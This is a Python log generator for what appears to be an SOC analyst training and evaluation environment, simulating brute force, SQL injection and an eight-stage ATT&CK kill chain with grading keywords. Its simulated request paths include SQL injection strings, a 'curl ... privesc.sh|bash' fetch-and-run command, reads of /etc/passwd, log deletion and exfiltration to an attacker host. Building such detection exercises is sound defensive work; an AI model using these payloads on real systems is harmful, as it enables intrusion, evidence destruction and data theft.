"""
Scenario-driven log generator for SOC Analyst Environment.

Loads scenario data from JSON files in the scenarios/ directory.
Falls back to hardcoded generation if the JSON file is not found.

Phase 1 – MITRE ATT&CK Kill Chain
──────────────────────────────────
For *task_hard*, the hardcoded fallback now produces a deterministic,
multi-stage APT simulation.  Each log dict carries two hidden metadata
keys that survive the ``Dict[str, Any]`` transport but are silently
ignored by ``LogEntry(**log)`` (Pydantic drops unknown fields):

* ``attack_stage``   – human-readable kill chain phase
                       (e.g., "reconnaissance", "exfiltration").
                       Benign logs use ``"benign"`` / ``"noise"``.
* ``mitre_technique`` – official ATT&CK technique ID
                       (e.g., "T1595", "T1078").  Benign logs use
                       ``None``.

The engine (Phase 2) will later key off these fields to score agents
on whether they detect *and* correctly attribute each stage.
"""

import json
import os
from typing import Any, Dict, List, Optional

# Path to the scenarios directory (relative to this file)
_SCENARIOS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scenarios")

# ── MITRE ATT&CK Kill Chain Stages ──────────────────────────────
# Canonical ordering used by the APT simulation.
KILL_CHAIN_STAGES: List[str] = [
    "reconnaissance",       # T1595 – Active Scanning
    "initial_access",       # T1078 – Valid Accounts / T1190 – Exploit Public-Facing Application
    "execution",            # T1059 – Command and Scripting Interpreter
    "persistence",          # T1136 – Create Account / T1505 – Server Software Component
    "privilege_escalation", # T1068 – Exploitation for Privilege Escalation
    "defense_evasion",      # T1070 – Indicator Removal / T1036 – Masquerading
    "collection",           # T1005 – Data from Local System
    "exfiltration",         # T1041 – Exfiltration Over C2 Channel
]


def load_scenario(task_id: str) -> Optional[Dict[str, Any]]:
    """
    Load a scenario JSON file by task_id.

    Args:
        task_id: One of 'task_easy', 'task_medium', 'task_hard'.

    Returns:
        Parsed scenario dict, or None if the file doesn't exist.
    """
    filepath = os.path.join(_SCENARIOS_DIR, f"{task_id}.json")
    if os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    return None


def generate_logs(task_id: str) -> List[Dict[str, Any]]:
    """
    Generate log entries for a given task.

    Loads from scenario JSON first. Falls back to hardcoded logs
    if the scenario file is not found.

    Args:
        task_id: Task identifier (task_easy, task_medium, task_hard).

    Returns:
        List of log entry dicts with keys: timestamp, source_ip,
        request_path, status_code, user_agent.
        Hidden metadata keys (attack_stage, mitre_technique) are
        included for engine consumption but ignored by LogEntry.
    """
    scenario = load_scenario(task_id)
    if scenario and "logs" in scenario:
        return scenario["logs"]

    # ── Fallback: hardcoded generation ────────────────────────────
    return _generate_hardcoded_logs(task_id)


def get_expected_keywords(task_id: str) -> List[str]:
    """
    Get expected keywords for reasoning evaluation.

    Args:
        task_id: Task identifier.

    Returns:
        List of keywords the agent's reasoning should mention.
    """
    scenario = load_scenario(task_id)
    if scenario:
        return scenario.get("expected_keywords", [])

    # ── Fallback keywords per task ────────────────────────────────
    if task_id == "task_hard":
        return [
            "APT", "kill chain", "reconnaissance", "initial access",
            "privilege escalation", "exfiltration", "lateral movement",
            "persistence", "defense evasion", "MITRE", "ATT&CK",
            "brute force", "credential", "webshell", "C2",
        ]
    return []


def get_threat_intel(task_id: str) -> List[Dict[str, Any]]:
    """
    Get threat intelligence feed entries for a task.

    Args:
        task_id: Task identifier.

    Returns:
        List of threat intel dicts.
    """
    scenario = load_scenario(task_id)
    if scenario:
        return scenario.get("threat_intel", [])

    # ── Fallback threat intel for hardcoded APT scenario ──────────
    if task_id == "task_hard":
        return [
            {
                "source": "AbuseIPDB",
                "ip": "198.51.100.14",
                "threat_type": "apt_recon",
                "confidence": 92,
                "last_seen": "2026-04-10T06:00:00Z",
            },
            {
                "source": "CrowdStrike Falcon",
                "ip": "203.0.113.42",
                "threat_type": "credential_stuffing",
                "confidence": 97,
                "last_seen": "2026-04-10T08:30:00Z",
            },
            {
                "source": "Mandiant",
                "ip": "203.0.113.42",
                "threat_type": "apt_group_lazarus",
                "confidence": 88,
                "last_seen": "2026-04-09T22:00:00Z",
            },
        ]
    return []


# ═══════════════════════════════════════════════════════════════════
# Private helpers
# ═══════════════════════════════════════════════════════════════════

def _tag(
    log: Dict[str, Any],
    stage: str,
    technique: Optional[str] = None,
) -> Dict[str, Any]:
    """Attach hidden kill chain metadata to a log dict.

    These keys survive ``Dict[str, Any]`` transport but are silently
    dropped by ``LogEntry(**log)`` because the Pydantic model does
    not declare them.
    """
    log["attack_stage"] = stage
    log["mitre_technique"] = technique
    return log


def _benign(
    timestamp: str,
    source_ip: str,
    path: str,
    user_agent: str,
    status_code: int = 200,
) -> Dict[str, Any]:
    """Convenience builder for benign / noise traffic."""
    return _tag(
        {
            "timestamp": timestamp,
            "source_ip": source_ip,
            "request_path": path,
            "status_code": status_code,
            "user_agent": user_agent,
        },
        stage="benign",
    )


def _generate_hardcoded_logs(task_id: str) -> List[Dict[str, Any]]:
    """
    Fallback hardcoded log generation when scenario JSON is missing.

    Deterministic — no randomization for reproducibility.
    """

    if task_id == "task_easy":
        return _generate_easy()
    elif task_id == "task_medium":
        return _generate_medium()
    elif task_id == "task_hard":
        return _generate_hard_apt()
    else:
        # Unknown task — return minimal benign traffic
        return [
            _benign(
                "2026-04-10T08:00:00Z",
                "192.168.1.10",
                "/",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            ),
        ]


# ── task_easy: simple brute-force ─────────────────────────────────

def _generate_easy() -> List[Dict[str, Any]]:
    """Brute-force login attempt from a single IP."""
    logs: List[Dict[str, Any]] = []

    # Normal traffic
    logs.append(_benign(
        "2026-04-10T08:01:12Z", "192.168.1.10", "/",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:14Z", "192.168.1.15", "/dashboard",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:18Z", "192.168.1.22", "/api/v1/health",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:20Z", "192.168.1.30", "/images/logo.png",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:25Z", "192.168.1.40", "/favicon.ico",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    ))

    # Attack: 5 rapid brute-force login attempts
    for i in range(5):
        logs.append(_tag(
            {
                "timestamp": f"2026-04-10T08:02:0{i}Z",
                "source_ip": "104.22.33.44",
                "request_path": "/api/v1/login",
                "status_code": 401,
                "user_agent": "python-requests/2.28.1",
            },
            stage="initial_access",
            technique="T1110",  # Brute Force
        ))

    return logs


# ── task_medium: distributed SQL injection ────────────────────────

def _generate_medium() -> List[Dict[str, Any]]:
    """Coordinated SQL injection from multiple IPs."""
    logs: List[Dict[str, Any]] = []

    # Normal traffic
    logs.append(_benign(
        "2026-04-10T08:01:12Z", "192.168.1.10", "/",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:14Z", "192.168.1.15", "/dashboard",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:18Z", "192.168.1.22", "/api/v1/health",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:20Z", "192.168.1.30", "/images/logo.png",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    ))
    logs.append(_benign(
        "2026-04-10T08:01:25Z", "192.168.1.40", "/favicon.ico",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    ))

    # Attack: coordinated SQLi from 3 IPs
    attack_ips = ["185.33.22.10", "185.33.22.45", "185.33.22.112"]
    paths = [
        "/users?id=1' OR '1'='1",
        "/users?id=1 UNION SELECT username,password FROM users--",
        "/search?q='; DROP TABLE users;--",
    ]
    for ip, path in zip(attack_ips, paths):
        logs.append(_tag(
            {
                "timestamp": "2026-04-10T10:15:10Z",
                "source_ip": ip,
                "request_path": path,
                "status_code": 500,
                "user_agent": "sqlmap/1.5.8#stable",
            },
            stage="initial_access",
            technique="T1190",  # Exploit Public-Facing Application
        ))

    return logs


# ══════════════════════════════════════════════════════════════════
# task_hard: Full MITRE ATT&CK APT kill chain
# ══════════════════════════════════════════════════════════════════

# Adversary profile
_APT_PRIMARY_IP   = "198.51.100.14"   # External C2 / recon host
_APT_SECONDARY_IP = "203.0.113.42"    # Credential-stuffing relay
_APT_INTERNAL_IP  = "10.10.44.3"      # Compromised internal host (post-pivot)
_EXFIL_IP         = "198.51.100.250"  # Exfiltration endpoint

# Benign cast (legitimate users / internal services)
_BENIGN_USERS = {
    "employee_alice":  ("192.168.1.10", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
    "employee_bob":    ("192.168.1.20", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"),
    "employee_carol":  ("192.168.1.35", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"),
    "mobile_dave":     ("192.168.1.40", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"),
    "internal_monitor":("10.0.0.5",    "InternalMonitor/3.1"),
    "vuln_scanner":    ("10.200.1.1",  "Nessus/10.4.1"),
}


def _generate_hard_apt() -> List[Dict[str, Any]]:
    """
    Full APT kill chain — 8 stages interleaved with benign noise.

    Kill chain modelled after real-world APT29 / Lazarus tradecraft:

    ┌──────────────────────────────────────────────────────────┐
    │  Stage 1 — Reconnaissance          (T1595, T1592)       │
    │  Stage 2 — Initial Access          (T1078, T1190)       │
    │  Stage 3 — Execution               (T1059.001)          │
    │  Stage 4 — Persistence             (T1505.003, T1136)   │
    │  Stage 5 — Privilege Escalation    (T1068)              │
    │  Stage 6 — Defense Evasion         (T1070.004, T1036)   │
    │  Stage 7 — Collection              (T1005)              │
    │  Stage 8 — Exfiltration            (T1041)              │
    └──────────────────────────────────────────────────────────┘

    Between every attack stage, 1-3 benign log entries are injected
    to simulate natural traffic and stress the agent's ability to
    separate signal from noise.
    """
    logs: List[Dict[str, Any]] = []
    alice_ip, alice_ua   = _BENIGN_USERS["employee_alice"]
    bob_ip, bob_ua       = _BENIGN_USERS["employee_bob"]
    carol_ip, carol_ua   = _BENIGN_USERS["employee_carol"]
    dave_ip, dave_ua     = _BENIGN_USERS["mobile_dave"]
    mon_ip, mon_ua       = _BENIGN_USERS["internal_monitor"]
    scan_ip, scan_ua     = _BENIGN_USERS["vuln_scanner"]

    # ── Pre-attack baseline traffic ───────────────────────────────
    logs.append(_benign("2026-04-10T13:55:00Z", alice_ip, "/", alice_ua))
    logs.append(_benign("2026-04-10T13:55:05Z", bob_ip, "/api/v1/dashboard", bob_ua))
    logs.append(_benign("2026-04-10T13:55:10Z", mon_ip, "/health", mon_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 1 — RECONNAISSANCE  (T1595: Active Scanning)
    # The adversary probes the target's attack surface.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:00:01Z",
        "source_ip": _APT_PRIMARY_IP,
        "request_path": "/",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    }, stage="reconnaissance", technique="T1595"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:00:03Z",
        "source_ip": _APT_PRIMARY_IP,
        "request_path": "/robots.txt",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    }, stage="reconnaissance", technique="T1595"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:00:06Z",
        "source_ip": _APT_PRIMARY_IP,
        "request_path": "/.well-known/security.txt",
        "status_code": 404,
        "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    }, stage="reconnaissance", technique="T1592"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:00:09Z",
        "source_ip": _APT_PRIMARY_IP,
        "request_path": "/sitemap.xml",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    }, stage="reconnaissance", technique="T1595"))

    # Noise: legitimate employee
    logs.append(_benign("2026-04-10T14:00:12Z", carol_ip, "/api/v1/products", carol_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 2 — INITIAL ACCESS  (T1078: Valid Accounts via cred-stuffing)
    # Adversary uses stolen credentials from a prior breach.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:01:00Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/login",
        "status_code": 401,
        "user_agent": "python-requests/2.31.0",
    }, stage="initial_access", technique="T1078"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:01:02Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/login",
        "status_code": 401,
        "user_agent": "python-requests/2.31.0",
    }, stage="initial_access", technique="T1078"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:01:04Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/login",
        "status_code": 401,
        "user_agent": "python-requests/2.31.0",
    }, stage="initial_access", technique="T1078"))

    # Successful login with stolen credentials
    logs.append(_tag({
        "timestamp": "2026-04-10T14:01:06Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/login",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="initial_access", technique="T1078"))

    # Noise: health check
    logs.append(_benign("2026-04-10T14:01:10Z", mon_ip, "/health", mon_ua))

    # Noise: legitimate user
    logs.append(_benign("2026-04-10T14:01:15Z", dave_ip, "/api/v1/notifications", dave_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 3 — EXECUTION  (T1059.001: PowerShell / Command Interpreter)
    # Adversary tests command execution via exposed debug endpoint.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:02:00Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=whoami",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="execution", technique="T1059.001"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:02:05Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=cat+/etc/passwd",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="execution", technique="T1059.001"))

    # Noise: legitimate browse
    logs.append(_benign("2026-04-10T14:02:08Z", alice_ip, "/api/v1/settings", alice_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 4 — PERSISTENCE  (T1505.003: Web Shell)
    # Adversary drops a web shell for future access.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:03:00Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/upload",
        "status_code": 201,
        "user_agent": "python-requests/2.31.0",
    }, stage="persistence", technique="T1505.003"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:03:10Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/uploads/.hidden/shell.php",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="persistence", technique="T1505.003"))

    # Adversary also creates a backdoor admin account
    logs.append(_tag({
        "timestamp": "2026-04-10T14:03:20Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/admin/users?action=create&user=svc_backup&role=admin",
        "status_code": 201,
        "user_agent": "python-requests/2.31.0",
    }, stage="persistence", technique="T1136.001"))

    # Noise: vuln scanner (legitimate, should NOT be blocked)
    logs.append(_benign("2026-04-10T14:03:25Z", scan_ip, "/api/v1/debug", scan_ua, 404))
    logs.append(_benign("2026-04-10T14:03:28Z", scan_ip, "/.env", scan_ua, 404))

    # ══════════════════════════════════════════════════════════════
    # STAGE 5 — PRIVILEGE ESCALATION  (T1068: Exploitation for Priv Esc)
    # Adversary exploits a local vulnerability to gain root.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:04:00Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=curl+http://198.51.100.14/privesc.sh|bash",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="privilege_escalation", technique="T1068"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:04:05Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=id",
        "status_code": 200,
        "user_agent": "python-requests/2.31.0",
    }, stage="privilege_escalation", technique="T1068"))

    # Noise: employees working
    logs.append(_benign("2026-04-10T14:04:10Z", bob_ip, "/api/v1/reports", bob_ua))
    logs.append(_benign("2026-04-10T14:04:15Z", carol_ip, "/api/v1/cart", carol_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 6 — DEFENSE EVASION  (T1070.004: File Deletion,
    #                              T1036: Masquerading)
    # Adversary covers tracks and blends in with legit traffic.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:05:00Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=rm+-rf+/var/log/auth.log",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }, stage="defense_evasion", technique="T1070.004"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:05:05Z",
        "source_ip": _APT_SECONDARY_IP,
        "request_path": "/api/v1/debug/exec?cmd=history+-c",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }, stage="defense_evasion", technique="T1070.003"))

    # Now pivots to internal IP — masquerading as internal service
    logs.append(_tag({
        "timestamp": "2026-04-10T14:05:10Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/admin/config",
        "status_code": 200,
        "user_agent": "InternalMonitor/3.1",
    }, stage="defense_evasion", technique="T1036"))

    # Noise
    logs.append(_benign("2026-04-10T14:05:15Z", mon_ip, "/metrics", mon_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 7 — COLLECTION  (T1005: Data from Local System)
    # Adversary harvests sensitive data using the compromised host.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:06:00Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/admin/users?export=csv",
        "status_code": 200,
        "user_agent": "InternalMonitor/3.1",
    }, stage="collection", technique="T1005"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:06:05Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/admin/database/dump?tables=credentials,sessions",
        "status_code": 200,
        "user_agent": "InternalMonitor/3.1",
    }, stage="collection", technique="T1005"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:06:10Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/admin/config?show=secrets",
        "status_code": 200,
        "user_agent": "InternalMonitor/3.1",
    }, stage="collection", technique="T1005"))

    # Noise: employee
    logs.append(_benign("2026-04-10T14:06:15Z", alice_ip, "/favicon.ico", alice_ua))
    logs.append(_benign("2026-04-10T14:06:20Z", dave_ip, "/api/v1/health", dave_ua))

    # ══════════════════════════════════════════════════════════════
    # STAGE 8 — EXFILTRATION  (T1041: Exfiltration Over C2 Channel)
    # Adversary sends collected data to external drop server.
    # ══════════════════════════════════════════════════════════════
    logs.append(_tag({
        "timestamp": "2026-04-10T14:07:00Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=14MB",
        "status_code": 200,
        "user_agent": "curl/7.88.1",
    }, stage="exfiltration", technique="T1041"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:07:05Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=8MB",
        "status_code": 200,
        "user_agent": "curl/7.88.1",
    }, stage="exfiltration", technique="T1041"))

    logs.append(_tag({
        "timestamp": "2026-04-10T14:07:10Z",
        "source_ip": _APT_INTERNAL_IP,
        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=3MB&final=true",
        "status_code": 200,
        "user_agent": "curl/7.88.1",
    }, stage="exfiltration", technique="T1041"))

    # ── Post-attack: normal traffic continues obliviously ─────────
    logs.append(_benign("2026-04-10T14:07:30Z", bob_ip, "/api/v1/settings", bob_ua))
    logs.append(_benign("2026-04-10T14:07:35Z", carol_ip, "/api/v1/products", carol_ua))
    logs.append(_benign("2026-04-10T14:07:40Z", mon_ip, "/health", mon_ua))

    return logs